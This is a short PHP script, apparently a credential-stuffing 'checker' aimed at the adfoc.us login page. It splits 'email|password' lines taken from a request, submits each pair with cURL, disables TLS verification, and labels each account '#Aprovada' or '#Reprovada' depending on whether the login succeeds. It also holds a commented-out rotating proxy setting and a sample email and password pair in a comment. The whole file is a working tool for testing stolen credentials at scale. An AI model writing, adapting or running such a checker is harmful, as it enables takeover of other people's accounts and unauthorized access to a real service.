<?php
error_reporting(0);
set_time_limit(0);

function multiexplode($delimiters, $string) {
	$partida = str_replace($delimiters, $delimiters[0], $string);
	$executar = explode($delimiters[0], $partida);
	return $executar;
}

$lista = $_REQUEST['lista'];
$email = multiexplode(array(";", ":", "|", ">"), $lista)[0];
$senha = multiexplode(array(";", ":", "|", ">"), $lista)[1];

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

if(file_exists("cookie.txt")){
unlink("cookie.txt");
}

$ch = curl_init();
/*
curl_setopt($ch, CURLOPT_PROXY, "http://proxy.apify.com:8000");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:SUA Senha");
*/
curl_setopt($ch, CURLOPT_URL, "https://adfoc.us/session/create");
curl_setopt($ch, CURLOPT_HTTPHEADER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_REFERER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). '/cookie.txt');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&password='.$senha.'');
$end = curl_exec($ch);


if (strpos($end, 'Logout') !== false) {
	echo '#Aprovada '.$email.' | '.$senha.'';
}else{
	echo '#Reprovada '.$email.' | '.$senha.'';
}

///////////////tayiwif@shayzam.net|tayiwif
////////////////
?>
